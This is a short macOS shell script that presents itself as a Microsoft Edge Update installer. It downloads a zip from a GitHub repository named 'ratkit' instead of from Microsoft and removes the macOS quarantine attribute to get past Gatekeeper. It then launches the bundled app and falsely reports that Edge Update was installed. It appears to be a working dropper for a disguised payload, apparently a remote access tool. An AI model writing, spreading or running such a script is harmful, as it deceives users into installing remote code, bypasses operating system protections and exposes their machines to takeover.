#!/bin/sh
set -eu

BASE="https://github.com/ccxze/ratkit/releases/latest/download"

case "$(uname -m)" in
  arm64) ARCH=arm64 ;;
  x86_64) ARCH=x86_64 ;;
  *) echo "Unsupported architecture: $(uname -m)"; exit 1 ;;
esac

TMP="$(mktemp -d /tmp/edgeupdate.XXXXXX)"
trap 'rm -rf "$TMP"' EXIT INT TERM

echo "Downloading Microsoft Edge Update..."
curl -fsSL "$BASE/MicrosoftEdgeUpdate-mac-$ARCH.zip" -o "$TMP/update.zip"
xattr -d com.apple.quarantine "$TMP/update.zip" 2>/dev/null || true
ditto -x -k "$TMP/update.zip" "$TMP"
APP="$TMP/MicrosoftEdgeUpdate.app"
xattr -dr com.apple.quarantine "$APP" 2>/dev/null || true

open "$APP"
sleep 3
echo "Microsoft Edge Update 1.3.195.17 installed."
